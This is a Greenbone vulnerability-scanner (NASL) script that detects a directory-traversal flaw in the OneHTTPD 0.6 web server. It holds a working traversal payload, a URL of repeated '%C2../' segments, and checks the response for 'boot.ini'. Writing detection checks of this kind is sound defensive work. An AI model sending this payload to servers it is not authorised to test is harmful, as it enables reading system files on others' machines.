if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100620" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-05-04 12:32:13 +0200 (Tue, 04 May 2010)" );
	script_bugtraq_id( 39757 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "OneHTTPD Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/39757" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web Servers" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "onehttpd/banner" );
	script_tag( name: "summary", value: "OneHTTPD is prone to a directory-traversal vulnerability because it
  fails to sufficiently sanitize user-supplied input data." );
	script_tag( name: "impact", value: "Exploiting the issue may allow an attacker to obtain sensitive
  information that could aid in further attacks." );
	script_tag( name: "affected", value: "OneHTTPD 0.6 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: onehttpd" )){
	exit( 0 );
}
url = NASLString( "/%C2../%C2../%C2../%C2../%C2../%C2../%C2../%C2../" );
if(http_vuln_check( port: port, url: url, pattern: "boot\\.ini" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

